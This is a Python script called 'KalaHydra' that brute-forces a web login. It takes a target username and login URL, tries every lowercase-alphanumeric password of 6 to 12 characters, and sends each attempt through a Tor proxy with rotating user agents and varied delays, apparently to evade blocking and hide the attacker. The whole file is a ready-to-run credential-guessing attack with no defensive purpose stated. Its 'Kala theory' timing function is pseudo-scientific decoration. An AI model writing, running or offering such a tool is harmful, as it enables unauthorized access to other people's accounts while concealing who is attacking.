#!/usr/bin/env python3
# KalaHydra Termux Version with Real Orbot/Tor Proxy Integration
import time
import math
import random
import requests
import itertools
import os

# Cyberpunk colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

# Kala Time Expansion Function
def kala_phi(t, tau_div_t=1.6, alpha=0.4, omega=1.3):
    return tau_div_t * (1 + alpha * math.sin(omega * t))

# SOCKS5 Proxy via Orbot
proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

# Full User-Agent Pool
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F)",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)",
    "Mozilla/5.0 (Android 11; Mobile; rv:94.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0)"
]

def generate_passwords(charset, min_len, max_len):
    for l in range(min_len, max_len + 1):
        for p in itertools.product(charset, repeat=l):
            yield ''.join(p)

def get_ip():
    try:
        r = requests.get("https://api.ipify.org", proxies=proxies, timeout=5)
        return r.text.strip()
    except:
        return "0.0.0.0"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def start_kalahydra(username, target_url, success_keyword):
    clear()
    print(f"{CYAN}🌌 KALAHYDRA CYBER TERMINAL | POWERED BY KALA THEORY\n{RESET}")
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    min_len, max_len = 6, 12
    start_time = time.time()
    attempt = 0

    for password in generate_passwords(charset, min_len, max_len):
        t_now = time.time() - start_time
        phi = kala_phi(t_now)
        delay = max(0.1, 1 / phi)

        headers = {
            'User-Agent': random.choice(user_agents),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {'username': username, 'password': password}

        try:
            r = requests.post(target_url, data=data, headers=headers, proxies=proxies, timeout=10)
            if success_keyword in r.text.lower():
                print(f"\n{GREEN}✅ ACCESS GRANTED — login: {username} | pass: {password}{RESET}")
                break
            else:
                print(f"{RED}🛑 ACCESS DENIED — {password}{RESET}")
        except Exception as e:
            print(f"{YELLOW}⚠️ ERROR: {e}{RESET}")

        ip = get_ip()
        print(f"{CYAN}🔁 TOR IP CYCLE... 🌐 IP: {ip}{RESET}")
        time.sleep(delay)
    else:
        print(f"\n{RED}⛔ No valid password found.{RESET}")

if __name__ == "__main__":
    try:
        print(f"{CYAN}🌐 Connecting through Orbot SOCKS5 (127.0.0.1:9050)...{RESET}")
        username = input(f"{YELLOW}👤 Enter target username: {RESET}")
        target_url = input(f"{YELLOW}🌐 Enter login URL: {RESET}")
        success_keyword = input(f"{YELLOW}🔑 Success keyword in response (e.g., dashboard): {RESET}").lower()
        start_kalahydra(username, target_url, success_keyword)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}🔻 Terminated by user.{RESET}")
